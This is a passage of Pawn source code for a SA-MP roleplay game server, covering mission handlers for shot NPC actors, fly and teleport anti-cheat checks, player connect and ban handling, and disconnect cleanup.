        GetActorPos(vojnik2Enemy3, ActorPos[0], ActorPos[1], ActorPos[2]);

        TogglePlayerControllable(playerid, 0);

        InterpolateCameraPos(playerid, Pos[0], Pos[1], Pos[2], ActorPos[0], ActorPos[1], ActorPos[2], 4000, CAMERA_CUT);

        defer resetCamera(playerid, 3);

        return 0;
    }

    if(damaged_actorid == vojnik2Boss && weaponid == 34 && vojnik2CP[playerid] == 8) {

        new Float:Pos[3];
        GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
        new Float:ActorPos[3];
        GetActorPos(vojnik2Boss, ActorPos[0], ActorPos[1], ActorPos[2]);

        TogglePlayerControllable(playerid, 0);

        InterpolateCameraPos(playerid, Pos[0], Pos[1], Pos[2], ActorPos[0], ActorPos[1], ActorPos[2], 4000, CAMERA_CUT);

        defer resetCamera(playerid, 4);

        return 0;
    }

    if(damaged_actorid == misijaEnemy1) {

        if(radiMisiju[playerid] != 3) return 0;
        if(misijaKradja[playerid] != 2) return 0;

        misijaKradja[playerid] = 3;

        SendInfoMessage(playerid, "Nastavi dalje!");

        ApplyActorAnimation(misijaEnemy1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(misijaEnemy1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(misijaEnemy1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(misijaEnemy1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);

        return 1;
    }

    if(damaged_actorid == misijaEnemy2) {

        if(radiMisiju[playerid] != 3) return 0;
        if(misijaKradja[playerid] != 3) return 0;

        misijaKradja[playerid] = 4;

        SendInfoMessage(playerid, "Nastavi dalje!");

        ApplyActorAnimation(misijaEnemy2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(misijaEnemy2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(misijaEnemy2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(misijaEnemy2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);

        return 1;
    }

    if(damaged_actorid == misijaEnemy3) {

        if(radiMisiju[playerid] != 3) return 0;
        if(misijaKradja[playerid] != 4) return 0;

        misijaKradja[playerid] = 5;

        SendInfoMessage(playerid, "Uzmi laptop sa stola tipkom 'N' !");

        misijaLaptop[playerid] = CreatePlayerObject(playerid, 19893, 1496.21289, -1696.54529, 7.71867,   0.00000, 0.00000, 0.00000);

        ApplyActorAnimation(misijaEnemy3, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(misijaEnemy3, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(misijaEnemy3, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(misijaEnemy3, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);

        return 1;
    }

    if(damaged_actorid == misijaPDActor) {

        if(radiMisiju[playerid] != 2) return 0;
        if(misijaUbistvo[playerid] != 2) return 0;

        misijaUbistvo[playerid] = 3;

        ResetAllWeapons(playerid);
        
        ApplyActorAnimation(misijaPDActor, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(misijaPDActor, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(misijaPDActor, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(misijaPDActor, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);

        Novi_SetPlayerCheckpoint(playerid, misijePosX, misijePosY, misijePosZ, 2.0);

        SendInfoMessage(playerid, "Uspesno si ubio policajca! Vrati se do sefa!");

        return 1;
    }

    if(damaged_actorid == EnemyActor1) {

        if(!UpucajNeprijatelja1{playerid}) return 0;
        if(!RadiVojnik{playerid}) return 0;
        if(UbioActora2{playerid}) return 0;
        UpucajNeprijatelja1{playerid} = true;
        ApplyActorAnimation(EnemyActor1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(EnemyActor1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(EnemyActor1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(EnemyActor1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        Novi_SetPlayerCheckpoint(playerid, 214.5136,1864.1028,13.1406, 2.0);
        VojnikMisijaJedanCP{playerid}++;
        UbioActora2{playerid} = true;

        return 1;
    }

    if(damaged_actorid == EnemyActor2) {

        if(!UpucajNeprijatelja2{playerid}) return 0;
        if(!RadiVojnik{playerid}) return 0;
        if(UbioActora3{playerid}) return 0;
        ApplyActorAnimation(EnemyActor2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(EnemyActor2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(EnemyActor2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(EnemyActor2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        Novi_SetPlayerCheckpoint(playerid, 254.5709,1826.2524,7.5547, 2.0);
        VojnikMisijaJedanCP{playerid}++;
        UbioActora3{playerid} = true;
        UpucajNeprijatelja2{playerid} = false;
        return 1;
    }

    if(damaged_actorid == ZlataraCuvar) {

        if( GetFactionType( playerid ) != ORG_TIP_BANDA && GetFactionType(playerid) != ORG_TIP_MAFIJA ) return 0;
        if(ZlataraOrobana) return 0;
        if(BankaUToku) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka banke u toku!");
        if(ZlataraRobUToku) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka zlatare u toku!");
        if(RolexUToku) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka rolex store-a u toku!");
        if(MuzejPokrenut) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka muzeja u toku!");
        if(ZlataraCuvarUpucan) return 0;
        if( GetPlayerWeapon(playerid) == 0) return SendErrorMessage(playerid, "Morate imati oruzije kod sebe!");
        if( PlayerInfo[playerid][xWanted] >= 1) return SendErrorMessage(playerid, "Trazeni ste, ne mozete to!");

        // new pd, ilegala;

        // foreach( Player, i ) {
        //     if( IsPlayerConnected( i ) ) {
        //         if(GetFactionType(i) == ORG_TIP_PD) pd++;
        //         else if(PlayerInfo[i][xClan] == PlayerInfo[playerid][xClan]) ilegala++;
        //     }
        // }

        // if(pd < 2) {

        //     SendErrorMessage(playerid, "Nema dovoljno clanova policije ( minimalno 3 )!");
        //     return 0;
        // }
        // if(ilegala < 2)  {

        //     SendErrorMessage(playerid, "Nema dovoljno tvojih clanova ( minimalno 3)!");
        //     return 0;
        // }

        ApplyActorAnimation(ZlataraCuvar, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(ZlataraCuvar, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(ZlataraCuvar, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(ZlataraCuvar, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);

        SendInfoMessage(playerid, "Pokrenu si rob zlatare! Postavi busilicu ispred sefa koristeci tipku N");
        SendInfoMessage(playerid, "Ne smes da napustis zlataru inace ce se rob prekinuti!");
        ZlataraCuvarUpucan = true;
        ZlataraRobUToku = true;
        RobaZlataru[playerid] = true;
        PostaviBusilicuZlatara[playerid] = true;

        PostaviWanted(playerid, "Rob Zlatare", "Nepoznat", 10);
        SendClientMessageToAll(0xFF0000FF, "(ZLATARA ROB) "col_white"Obavestavamo gradjane da se upravo odvija pljacka zlatare!");
        foreach( Player, i ) {
            if( IsPlayerConnected( i ) ) {
                if( OI[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_PD ) {
                    SCM( i, 0x8D8DFF00, "Cuvar u zlatari je ubijen! Sve jedinice na lice mesta!" );
                }
            }
        }
        return 1;
    }

    // if(damaged_actorid == PoliceActor[playerid]) {

    //     if(UpucaoPolicajca[playerid]) return 1; //Ovo je jedna provera da ga ne puca 2 puta
    //     ApplyDynamicActorAnimation(PoliceActor[playerid], "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0 );
    //     ApplyDynamicActorAnimation(PoliceActor[playerid], "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0 );
    //     ApplyDynamicActorAnimation(PoliceActor[playerid], "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0 );
    //     ApplyDynamicActorAnimation(PoliceActor[playerid], "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0 );
    //     Novi_DisablePlayerCheckpoint(playerid);
    //     UpucaoPolicajca[playerid] = true;
    //     ResetAllWeapons(playerid);
    //     defer MiniTimer(playerid); //Ovo je timer da bi igrac ostao 2 sekunde i video kako pandur pada
    //     return 1;
    // }
    
	if(damaged_actorid == NaucnikActor) //DONE
	{
		if(!UpucajNaucnika2{playerid}) return 0;
		if(!RadiVojnik{playerid}) return 0;
		if(UbioActora{playerid}) return 0;
		ApplyActorAnimation(NaucnikActor, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(NaucnikActor, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(NaucnikActor, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(NaucnikActor, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
		SendClientMessage(playerid, -1, "Pronadji vakcinu!");
		Novi_SetPlayerCheckpoint(playerid, 271.8935,1854.0039,8.7649, 2.0);
		VojnikMisijaJedanCP{playerid} = 18;
		UbioActora{playerid} = true;
		UpucajNaucnika2{playerid} = false;
		return 1;
	}
	if(damaged_actorid == NaucnikActor1) //DONE
	{
		if(!UpucajNaucnika1{playerid}) return 0;
		if(!RadiVojnik{playerid}) return 0;
		if(UbioActora1{playerid}) return 0;
		ApplyActorAnimation(NaucnikActor1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(NaucnikActor1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(NaucnikActor1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(NaucnikActor1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
		Novi_SetPlayerCheckpoint(playerid, 313.8146,1848.8173,7.7266, 2.0);
		VojnikMisijaJedanCP{playerid}++;
		UbioActora1{playerid} = true;
		UpucajNaucnika1{playerid} = false;
		return 1;
	} 

	if(damaged_actorid == Kapetan1)
	{
		if(!RadiSabotazer{playerid}) return 0;
		if(UbioKapetana1{playerid}) return 0;
		ApplyActorAnimation(Kapetan1, "PED", "KO_shot_stom", 4.0, 1, 0, 0, 0, 0);
        ApplyActorAnimation(Kapetan1, "PED", "KO_shot_stom", 4.0, 1, 0, 0, 0, 0);
        ApplyActorAnimation(Kapetan1, "PED", "KO_shot_stom", 4.0, 1, 0, 0, 0, 0);
        ApplyActorAnimation(Kapetan1, "PED", "KO_shot_stom", 4.0, 1, 0, 0, 0, 0);
		UpucaKapetana{playerid}++;
		UbioKapetana1{playerid} = true;
		if(UpucaKapetana{playerid} == 2)
		{
			Novi_SetPlayerCheckpoint(playerid, -2470.8965,1541.0388,33.2344, 2.0);
			SendSabotage(playerid, "Aktiviraj eksploziv!");
			SabotazerPosloviCP{playerid} = 13;
			return 1;
		}
		return 1;
	} 
	if(damaged_actorid == Kapetan2)
	{
		if(!RadiSabotazer{playerid}) return 0;
		if(UbioKapetana2{playerid}) return 0;
		ApplyActorAnimation(Kapetan2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(Kapetan2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(Kapetan2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(Kapetan2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
		UpucaKapetana{playerid}++;
		UbioKapetana2{playerid} = true;
		if(UpucaKapetana{playerid} == 2)
		{
			Novi_SetPlayerCheckpoint(playerid, -2470.8965,1541.0388,33.2344, 2.0);
			SendSabotage(playerid, "Aktiviraj eksploziv!");
			SabotazerPosloviCP{playerid} = 13;
			return 1;
		}
		return 1;
	}
	defer TimerZaActoreNormal();
	return 1;
}

stock CheckTeleports( i ) {

    if( antiCheatSS[ antiFlyH ] == true ) {
		if( antiCheatCS[ i ][ TeleportCheck ] <= 0 && WatchingTV{ i } == 0 && GetPlayerState( i ) == PLAYER_STATE_ONFOOT ) {
			if( !AdminDuty[ i ] && GetPlayerSpecialAction( i ) != SPECIAL_ACTION_USEJETPACK && GetPlayerWeapon( i ) != 46 ) {
				if( GetPlayerAnimationIndex( i ) != 1195 && GetPlayerAnimationIndex( i ) != 1130 ) {
					if( GetPlayerSurfingVehicleID( i ) == INVALID_VEHICLE_ID && GetPlayerSurfingObjectID( i ) == INVALID_OBJECT_ID && GetPlayerInterior( i ) == 0 && GetPlayerVirtualWorld( i ) == 0  ) {
						if( !IsPlayerInDynamicArea( i, VIPBaza ) &&
							!IsPlayerInDynamicArea( i, MafijaY ) &&
							!IsPlayerInDynamicArea( i, MafijaTSM ) &&
							!IsPlayerInDynamicArea( i, FBIBaza ) &&
							!IsPlayerInDynamicArea( i, GradjPosao ) &&
							!IsPlayerInDynamicArea( i, FarmerPosao ) &&
							!IsPlayerInDynamicArea( i, AdminBaza ) &&
							!IsPlayerInDynamicArea( i, SpawnZona ) &&
							!IsPlayerInDynamicArea( i, SSB ) &&
							!IsPlayerInDynamicArea( i, KosacMost ) &&
							!IsPlayerInDynamicArea( i, ZgradaNeka ) &&
							!IsPlayerInDynamicArea( i, GSFMost ) &&
							!IsPlayerInDynamicArea( i, BinaBre ) )
						{
							
							new Float:Pos[ 5 ];
							GetPlayerPos( i, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
							MapAndreas_FindZ_For2DCoord( Pos[ 0 ], Pos[ 1 ], Pos[ 3 ] );
							Pos[ 4 ] = floatsub( Pos[ 2 ], Pos[ 3 ] );
							if( Pos[ 4 ] > 10 ) {
							    OnPlayerCheat( i, DETECT_FLY_HACK, 0, 0 );
							}
						}
					}
				}
			}
		}
	}

	if( antiCheatSS[ antiTeleportH ] == true ) {
	    new Float:Pos[ 3 ];
		GetPlayerPos( i, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

		if( antiCheatCS[ i ][ TeleportCheck ] <= 0 ) {
			if( ( Pos[ 2 ] < 900.0 ) == ( antiCheatCS[ i ][ TeleportPos ][ 2 ] < 900.0 ) ) {

				if( GetPlayerState( i ) != PLAYER_STATE_PASSENGER && WatchingTV{ i } == 0 && GetPlayerSurfingVehicleID( i ) == INVALID_VEHICLE_ID && PlayerInfo[ i ][ xRPLearn ] <= 0 && PlayerInfo[ i ][ xPocetniTut ] == 1 && !IsVehicleLetelica( GetPlayerVehicleID( i ) ) ) {

					if( !IsPlayerInRangeOfPoint( i, 100.0, antiCheatCS[ i ][ TeleportPos ][ 0 ], antiCheatCS[ i ][ TeleportPos ][ 1 ], antiCheatCS[ i ][ TeleportPos ][ 2 ] ) ) {

						antiCheatCS[ i ][ TeleportHack ]++;
	         			if( antiCheatCS[ i ][ TeleportHack ] >= 3 || IsCheatPosition( i ) ) {
							OnPlayerCheat( i, DETECT_TELEPORT_HACK, 0, 0 );
						}
					}
				}
			}
		}
		else {
			antiCheatCS[ i ][ TeleportCheck ]--;
		}
		antiCheatCS[ i ][ TeleportPos ][ 0 ] = Pos[ 0 ];
		antiCheatCS[ i ][ TeleportPos ][ 1 ] = Pos[ 1 ];
		antiCheatCS[ i ][ TeleportPos ][ 2 ] = Pos[ 2 ];
	}
}

public OnPlayerRequestClass( playerid, classid) {

    if(IsPlayerNPC(playerid)) return 1;
    TogglePlayerSpectating(playerid, true);
	if( PlayerLogged[ playerid ] == true ) {
		Novi_SetSpawnInfo( playerid );
    	SpawnPlayer( playerid );
	}
    else return false;
	return true;
}

forward Login( playerid );
public Login( playerid ) {

    SetPlayerInterior(playerid, 2);
    SetPlayerVirtualWorld(playerid, 2);
    TogglePlayerSpectating( playerid, true );
    InterpolateCameraPos(playerid, 2580.070312, -1288.746948, 1059.749389, 2579.931884, -1301.240234, 1061.587036, 7000);
    InterpolateCameraLookAt(playerid, 2579.762939, -1293.662475, 1060.611206, 2575.349365, -1299.242187, 1061.496093, 7000);
    Novi_SetPlayerPos( playerid, 2582.8789,-1282.1687,1065.3594);
    defer InterpolacijaTut2(playerid);

    ClearChat( playerid, 25 );

	//LoginTDControl( playerid, true );
	format( sDStrg, sizeof( sDStrg ),DialogTekstovi[ 0 ], MAX_POKUSAJ_LOGINA );
	PrviSpawn[ playerid ] = 1;
	return 1;
}

public Register( playerid ) {

    // UTutorialu[playerid] = true; 
    // Tutorial(playerid); 

    UTutorialu[playerid] = false;

    ClearChat( playerid, 25 );

    // defer registerTimer(playerid);

    RegisterTDControl( playerid, true );
    //DestroyDynamicActor(ZatvorenikActor[playerid]);
    IgracSeRegistruje[ playerid ] = true;
    SelectTextDraw( playerid, 0x37672AFF );

	return true;
}

forward Novi_Kick( playerid );
public Novi_Kick( playerid ) {
    SetTimerEx( "KickIgraca", 1000, 0, "d", playerid );
}

CheckRekord( ) {
	if( ServerInfo[ RekordServera ] < NumberOfConnectedPlayers( ) ) {
	    ServerInfo[ RekordServera ] = NumberOfConnectedPlayers( );

        va_SendClientMessageToAll(-1, "{F55B65}[VALHALLA - REKORD] {FFFFFF}Rekord servera je oboren! Novi rekord : {FF0000}%d", ServerInfo[ RekordServera ]);
	    
	}
}

NumberOfConnectedPlayers( ) {
	new Connected = 0;
	foreach( Player, i ) if( IsPlayerConnected( i ) && !IsPlayerNPC( i ) ) Connected++;
	return Connected;
}

public OnPlayerConnect( playerid ) {

    if(IsPlayerNPC(playerid)) return 0;

    if (!SvGetVersion(playerid)) SendInfoMessage(playerid, "Nemate validnu verziju SAMPA ( R1 ili R3 ) ili nemate voice chat!");
    else if (!SvHasMicro(playerid)) SendInfoMessage(playerid, "Nemate mikrofon za voice chat!");
    else if ((lstream[playerid] = SvCreateDLStreamAtPlayer(40.0, SV_INFINITY, playerid, 0xff0000ff, "L"))) { // red color
        SendInfoMessage(playerid, "Voice Chat uspesno ucitan, koristite tipku 'X' za pricanje!");
        SvAddKey(playerid, 0x58);
    }

    nosiTrainBox[playerid] = false;

    BankaBusilicaTDKreiraj(playerid);

    kreirajKrvarenjeTD(playerid);

    buyGunTDCreate(playerid);

    achivementsTDCreate(playerid);

    bankaTDCreate(playerid);

    AirDropTDCreate(playerid);

    hackingTDCreate(playerid);

    SpinInterval[playerid] = 0;
    PlayerCaseX[playerid] = 0;
    OpenCaseShown[playerid] = false;

    //PlayerRoute[playerid][Destination] = -1;

    ResetWarStatistics( playerid );
    CreatingWAR[ playerid ] = -1;

    OrgVeh[playerid] = -1;

    BeliTD[playerid] = CreatePlayerTextDraw(playerid, -33.200031, -26.035589, "box");
    PlayerTextDrawLetterSize(playerid, BeliTD[playerid], 0.000000, 61.519996);
    PlayerTextDrawTextSize(playerid, BeliTD[playerid], 743.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BeliTD[playerid], 1);
    PlayerTextDrawColor(playerid, BeliTD[playerid], -1);
    PlayerTextDrawUseBox(playerid, BeliTD[playerid], 1);
    PlayerTextDrawBoxColor(playerid, BeliTD[playerid], -1);
    PlayerTextDrawSetShadow(playerid, BeliTD[playerid], 0);
    PlayerTextDrawBackgroundColor(playerid, BeliTD[playerid], 255);
    PlayerTextDrawFont(playerid, BeliTD[playerid], 1);
    PlayerTextDrawSetProportional(playerid, BeliTD[playerid], 0);
    PlayerTextDrawSetSelectable(playerid, BeliTD[playerid], true);

    OnlineIgraca++;

	InitFly(playerid);

	ResetovanjeVoidovihVarijabli(playerid);
    
    ServerInfo[ BrojPosetaServeru ]++;

    ApplyAnimation(playerid, "BOMBER", "null", 0.0, false, false, false, false, 0, false); 
	ApplyAnimation(playerid, "ROB_BANK", "null", 0.0, false, false, false, false, 0, false);

	CheckRekord( );
    ObrisiObjekte( playerid );
    ResetPlayer( playerid );
    
	SetPlayerVirtualWorld(playerid, (playerid + 2000));
    SetPlayerColor( playerid, 0xFFFFFF00 );


	CreatePlayerTextDraws( playerid );
	PreloadAnimations( playerid );

    new playersip[ 128 ];
    GetPlayerIp( playerid, playersip, sizeof( playersip ) );
	new string[ 128 ];
	
	format( string, sizeof( string ), "Igrac: %s | IP: %s ", ImeIgraca( playerid ), playersip );
	LogSave( "Ostalo/LogConnect.log", string );

	if( fexist( Korisnici ( playerid ) ) ) {
	    INI_ParseFile( Korisnici( playerid ), "OcitajKorisnika", .bExtra = true, .extra = playerid);

		if( PlayerInfo[ playerid ][ xBDays ] > 0) {
		    new year,day,month;
			getdate( year, month, day );

			if( PlayerInfo[ playerid ][ xBDays ] > day && PlayerInfo[ playerid ][ xBMonths ] >= month && PlayerInfo[ playerid ][ xBYears ] >= year ) {
				SCM( playerid, CRVENA, "__________________BAN________________");
				SendClientMessageEx( playerid, BELA, ""col_white"Banovan si sa ovog servera do "col_crvena"%d/%d/%d"col_white".", PlayerInfo[ playerid ][ xBDays ], PlayerInfo[ playerid ][ xBMonths ], PlayerInfo[ playerid ][ xBYears ] );
				SCM( playerid, BELA, ""col_white"Ukoliko mislis da je ovo greska.");
				SCM( playerid, BELA, ""col_white"Zahtev za unban mozes traziti na "col_crvena"forumu."col_white"");
				SCM( playerid, BELA, ""col_white"Forum: www."SRVBOJA1SCM"valhalla-ogc"col_white".com");
				SCM( playerid, CRVENA, "_____________________________________");
				Kickovanje( playerid, " ");
				return 1;
			}
		}

        if( PlayerInfo[ playerid ][ xBDays ] > 0) {
            new year,day,month;
			getdate( year, month, day );
            if( PlayerInfo[ playerid ][ xBDays ] < day ){
				PlayerInfo[ playerid ][ xBDays ] = 0;
			}
		}

		if( PlayerInfo[ playerid ][ xRegistrovan ] == 1 ) {
		    SetTimerEx( "Login", 100, false, "d", playerid );
		}
		else {
		
		    if( ServerInfo[ Registracija ] == false ) {
		    
		        SendClientMessage( playerid, CRVENA, "REGISTRACIJA JE TRENUTNO ONEMOGUCENA." );
		        SendClientMessage( playerid, CRVENA, ""SRVBOJA1SCM"Valhalla "col_white"Admin TEAM." );
		        SetTimerEx( "KickIgraca", 150, false, "d", playerid );
		        return 1;
		    }
		    
			SetTimerEx( "Register", 100, false, "d", playerid );
		}
	}
	else {
	    if( !IsValidRoleplayName( ImeIgraca( playerid ) ) ) {
			SendClientMessage( playerid, CRVENA, "Dobili ste kick zbog krivo formatiranog imena!" );
			SendClientMessage( playerid, CRVENA, "Vase ime mora biti u formatu Ime_Prezime!" );
			SetTimerEx( "KickIgraca", 150, false, "d", playerid );
			return 1;
		}
	
	    if( ServerInfo[ Registracija ] == false ) {

			SendClientMessage( playerid, CRVENA, "REGISTRACIJA JE TRENUTNO ONEMOGUCENA." );
			SendClientMessage( playerid, CRVENA, ""SRVBOJA1SCM"Valhalla "col_white"Admin TEAM." );
			SetTimerEx( "KickIgraca", 150, false, "d", playerid );
            return 1;
	    }
	    
	    SetTimerEx( "Register", 100, false, "d", playerid );
	}
	
	
	proveriAlias( playerid );
	return true;
}


public OnPlayerDisconnect( playerid, reason ) {

    if (lstream[playerid]) {

        SvDeleteStream(lstream[playerid]);
        lstream[playerid] = SV_NULL;
    }

    if(KoristiKran[playerid]) {
        KoristiKran[playerid] = false;
        KranUpotreba = false;
    }

    if(NosiBankaTorbu[playerid]) {

        NosiBankaTorbu[playerid] = false;

        new Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ;
        GetPlayerPos(playerid, IgracPosX, IgracPosY, IgracPosZ);
        defer KreirajBankaPickup(Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ);
    }

    if(WorkShopBuyModel[playerid] != 0) {
    
        resetWorkshopBuying(playerid);
    }

    // if(snowOn[playerid])
    // {
    //     for(new i = 0; i < MAX_SNOW_OBJECTS; i++) DestroyDynamicObject(snowObject[playerid][i]);
    //     snowOn[playerid] = false;
    //     KillTimer(updateTimer[playerid]);
    // }

    if(radiPilot[playerid] >= 1) {

        if(IsValidVehicle(pilotVozilo[playerid]))
            Novi_DestroyVehicle(pilotVozilo[playerid]);
        pilotVozilo[playerid] = -1;
    }

    if(prevoziDrva[playerid] >= 1) {

        if(IsValidVehicle(posaoDrvaVozilo[playerid]))
            Novi_DestroyVehicle(posaoDrvaVozilo[playerid]);

        posaoDrvaVozilo[playerid] = -1;
    }

    if(RadiDelivery[playerid]) {

        Novi_DestroyVehicle(DeliveryVozilo[playerid]);
        DeliveryVozilo[playerid] = -1;
    }
    if(KrenuoKosenje[playerid]) {

        Novi_DestroyVehicle(kosacVozilo[playerid]);
        kosacVozilo[playerid] = -1;
    }

    if(inFirstPerson[playerid])
    {
        DestroyObject(firstPerson[playerid]);
        inFirstPerson[playerid] = false;
    }

    if(TimerAutoPilot[playerid] != (-1))
    {
        #if defined USE_TIMERS
        KillTimer(TimerAutoPilot[playerid]);
        #endif
        TimerAutoPilot[playerid] = -1;
        DeleteArray(autopilotID[playerid]);
        autopilotID[playerid] = -1;
        CurrTarget[playerid] = 0;
    }

    if(radiVojnik2[playerid]) {

        if(IsValidVehicle(vojnik2Veh[playerid]))
            Novi_DestroyVehicle(vojnik2Veh[playerid]);

        vojnik2Veh[playerid] = -1;
    }

    // if(IsValidPlayerObject(playerid, snowobj[playerid]))
    //     DestroyPlayerObject(playerid,snowobj[playerid]);

    if(PlayerInfo[playerid][xParadox] == 1) {

        DestroyDynamicObject(room[playerid]);
        DestroyDynamicObject(stfloor[playerid]);
        DestroyDynamicObject(ndfloor[playerid]);
    }

    if(GetPVarInt(playerid,"roped") == 1)
    {
        for(new destr=0;destr<=ropelength;destr++)
        {
            DestroyDynamicObject(r0pes[playerid][destr]);
        }
    }

    // if(PlayerRoute[playerid][Destination] != -1) {
    //     DisableGPS(playerid);
    // }

    if(ProdajeKokain[playerid] >= 1) ProdajaFavella = false;

    if( WARPInfo[ playerid ][ warTeam ][ 0 ] == true ) {
        format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR | "COL_TEAM1"%s: "COL_WHITE"leave server.", ImeIgraca( playerid ) );
        WARMessage( WARPInfo[ playerid ][ warID ], -1, globalstring );
        WARInfo[ WARPInfo[ playerid ][ warID ] ][ warTeamMembers ][ 0 ]--;
    }

    if( WARPInfo[ playerid ][ warTeam ][ 1 ] == true ) {
        format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR | "COL_TEAM2"%s: "COL_WHITE"leave server.", ImeIgraca( playerid ) );
        WARMessage( WARPInfo[ playerid ][ warID ], -1, globalstring );
        WARInfo[ WARPInfo[ playerid ][ warID ] ][ warTeamMembers ][ 1 ]--;
    }

    if(OrgVeh[playerid] != -1) {

        new id = OrgVehID[playerid];
        if(OrgVehBroj[playerid] == 1) {

            OrgVehInfo[id][oVehKolicina1]++;
        }
        if(OrgVehBroj[playerid] == 2) {

            OrgVehInfo[id][oVehKolicina2]++;
        }
        if(OrgVehBroj[playerid] == 3) {

            OrgVehInfo[id][oVehKolicina3]++;
        }
        if(OrgVehBroj[playerid] == 4) {

            OrgVehInfo[id][oVehKolicina4]++;
        }
        if(OrgVehBroj[playerid] == 5) {

            OrgVehInfo[id][oVehKolicina5]++;
        }
        Novi_DestroyVehicle(OrgVeh[playerid]);
        OrgVeh[playerid] = -1;
        // Delete3DTextLabel(OrgVehLabelIgrac[playerid]);
        SacuvajOrgVehPickup(id);
    }

    if(PostavioRadar[playerid]) {

        DestroyDynamicObject(RadarObjekat[playerid]);
    } 

    OnlineIgraca--;

    if(DronVozi[playerid] != -1) {

        Novi_DestroyVehicle( DronVozi[ playerid ] );
        DronVozi[ playerid ] = -1;
    }

    if(UTutorialu[playerid]) {

        DestroyDynamicActor(MichaelActor[playerid]);
        DestroyDynamicActor(AdvokatActor[playerid]);
        DestroyDynamicActor(ZatvorenikActor[playerid]);
        DestroyActor(PoliceActor[playerid]);
    }

    onlinepl--;

	if(Rentao[playerid])
	{
		Novi_DestroyVehicle(RentVozilo[playerid]);
        RentVozilo[playerid] = -1;
        printf("Unistio Rent vozilo disconnect");
	}

    new lastid = playerid;
    if( IsValidDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] ) ) {
		DestroyDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] );
	}
	
    if( IsValidDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] ) ) {
		DestroyDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] );
	}

	if( IsValidDynamicCP( PlayerGpsRadar[ playerid ][ _pgrCheckPointId ] ) ) {
		DestroyDynamicCP( PlayerGpsRadar[ playerid ][ _pgrCheckPointId ] );
	}

    if( IsPlayerInAnyVehicle( playerid ) ) {
        new Float:x,Float:y,Float:z,vehicleid = GetPlayerVehicleID(playerid);
		GetVehiclePos( vehicleid,x, y, z );
		RealVehiclePositions[ vehicleid ][ 0 ] = x;
		RealVehiclePositions[ vehicleid ][ 1 ] = y;
		RealVehiclePositions[ vehicleid ][ 2 ] = z;
	}

